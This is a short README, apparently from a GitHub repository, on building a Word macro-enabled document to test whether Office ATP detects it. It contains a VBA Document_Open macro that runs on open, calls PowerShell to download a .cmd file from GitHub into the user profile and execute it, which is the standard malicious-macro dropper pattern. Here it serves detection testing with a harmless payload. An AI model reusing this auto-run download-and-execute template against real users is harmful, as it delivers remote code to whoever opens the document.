# Trigger Office ATP using Word macro

1. Open ```%AppData%\Microsoft\Templates\Normal.dotm```
2. Open **Visual Basic Editor** with ```Alt+F11```
3. Double-click **ThisDocument** under **Project (Document1)** to open the macro editor
4. Paste in the example Macro below
5. At the top of Visual Basic Editor, select **Save Document1** and select type as **Word Macro-Enabled Document**
6. This should be sufficient to trigger Office ATP, but if you would like to test then you can double-click **.docm** - this will trigger a download from GitHub, execute as a batch file, and open a message box.

```
Private Sub Document_Open()

Dim com As String
Dim des As String
Dim path As String

com = "powershell -noexit -Command (Invoke-WebRequest 'https://github.com/milesgratz/Microsoft365Misc/blob/master/TriggerOfficeATP_mkdir_example.cmd' -OutFile "
des = Environ("USERPROFILE")
path = com & des & "\\TriggerOfficeATP_mkdir_example.cmd)"

Shell ("powershell -noexit -Command " & path)
MsgBox "This document is running a macro to try to trigger Defender ATP... check your userprofile for a created file...."
End Sub
```

## References

https://emptydc.com/2019/08/02/what-does-office-atp-safe-attachments-actually-block/

## Credits
Largely ~~stolen~~ inspired by [Jan Geisbauer's example on emptydc.com](https://emptydc.com/2019/08/02/what-does-office-atp-safe-attachments-actually-block/) project.  
